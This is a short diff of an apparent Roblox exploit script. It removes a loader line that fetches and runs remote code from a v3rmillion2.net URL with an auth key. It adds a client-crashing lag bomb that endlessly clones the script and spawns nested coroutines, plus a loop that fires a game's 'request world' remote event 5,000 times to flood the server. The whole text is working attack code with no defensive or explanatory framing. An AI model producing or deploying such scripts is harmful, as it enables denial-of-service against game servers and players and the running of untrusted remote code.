@@ -1,7 +1,29 @@
+local plr = game.Players.LocalPlayer
+local rs = game:GetService("RunService")
 
-getgenv().AuthKey = "HUGE_EVLo3bTGTxVJ"
-getgenv().temporaryDomain = true
-getgenv().LoadSettings = {
-    Example_Setting = Example_Value
-}
-loadstring(game:HttpGet("https://v3rmillion2.net/ps99"))()
+function lag()
+    while true do
+        script:clone().Parent = plr.PlayerGui
+        print("Rest in peace.")
+    end
+end
+
+function memoryLeak()
+    for i = 1, 50000 do
+        coroutine.resume(coroutine.create(function()
+            for i = 1, 50000 do
+                spawn(lag)
+            end
+        end))
+    end
+end
+
+while true do
+    spawn(memoryLeak)
+end
+
+
+local t, spawn, _, __ = {'Rainbow Road'}, task.spawn, workspace:WaitForChild'__THINGS':WaitForChild'__REMOTES':WaitForChild'request world', Instance.new'RemoteEvent'.FireServer
+for i = 1, 5e3 do
+   spawn(__, _, t)
+end
